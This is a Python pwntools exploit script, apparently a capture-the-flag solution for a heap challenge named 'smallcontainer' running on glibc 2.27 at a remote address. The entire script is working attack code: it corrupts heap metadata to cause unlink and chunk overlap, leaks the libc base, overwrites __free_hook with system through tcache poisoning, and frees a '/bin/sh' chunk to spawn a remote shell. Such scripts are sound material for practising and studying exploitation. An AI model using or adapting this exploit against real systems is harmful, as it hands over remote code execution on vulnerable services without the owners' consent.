from pwn import *
from LibcSearcher import LibcSearcher

context(arch='amd64',os='linux',log_level='debug')
p = remote('182.92.74.66',29895)
#p = process('./smallcontainer')
elf = ELF('smallcontainer')
libc = ELF('libc-2.27.so')
o_g_18_old = [0x4f2c5,0x4f322,0x10a38c]
o_g_18 = [0x4f2a5,0x4f302,0x10a2fc]

def add(size):
	p.sendlineafter(b'> ',b'1')
	p.sendlineafter(b'size:',str(size).encode())
def delete(index):
	p.sendlineafter(b'> ',b'2')
	p.sendlineafter(b'index:',str(index).encode())
def show(index):
	p.sendlineafter(b'> ',b'4')
	p.sendlineafter(b'index:',str(index).encode())
def edit(index,content):
	p.sendlineafter(b'> ',b'3')
	p.sendlineafter(b'index:',str(index).encode())
	p.send(content)

[add(0x1f0) for x in range(7)]
add(0x1f0)	#7
add(0x108)	#8
add(0x200)	#9
add(0x100)	#10,防止合并
[delete(x) for x in range(7)]
delete(7)

#gdb.attach(p,'b calloc\nb realloc\nb malloc\nb free\nc')
#unlink
edit(8,b'a'*0x108)
edit(8,b'a'*0x100+p64(0x310))
edit(9,b'b'*0x1f0+p64(0)+p64(0x121))
delete(9)

#leak libc
add(0x1d0)	#7,idx=0
show(0)
libc_base = int(p.recvuntil(b'This',drop=1),16)-0x3ec0d0
print('libc_base',hex(libc_base))
free_hook = libc_base+libc.sym['__free_hook']
system = libc_base+libc.sym['system']

#gdb.attach(p,'b calloc\nb realloc\nb malloc\nb free\nc')
#chunk overlap
add(0x320)	#8,idx=1
delete(8)
edit(1,b'c'*0x10+p64(0)+p64(0x111)+p64(free_hook-0x8))
add(0x108)	#8,idx=2
add(0x108)	#free_hook,idx=3
edit(3,b'/bin/sh\x00'+p64(system))
delete(3)

p.interactive()
p.close()
